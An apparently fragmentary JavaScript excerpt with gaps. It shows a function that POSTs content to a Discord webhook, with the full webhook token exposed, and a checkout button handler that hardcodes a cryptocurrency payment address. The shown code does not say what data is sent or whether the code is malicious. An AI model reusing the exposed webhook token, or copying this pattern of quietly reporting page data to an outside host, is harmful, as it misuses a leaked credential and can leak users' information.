...
function sendMessage(cont) {
    if (show_dc) {
        ...
        request.open("POST", "https://discord.com/api/webhooks/98369449798696970/IagVh0aI66AKpx7xq-XZ8ZAiztj9benfVw3onYCF-GbcTuZz-g-tKgz7tpfZz3I9V654");
  ...
  */
  ...
  const initPayButton = () => {
    checkoutBtn.addEventListener('click', async () => {
      ...
      const paymentAddress = '0xb6F77Ea1a848eC83757A387d8F6A8d5570537810'
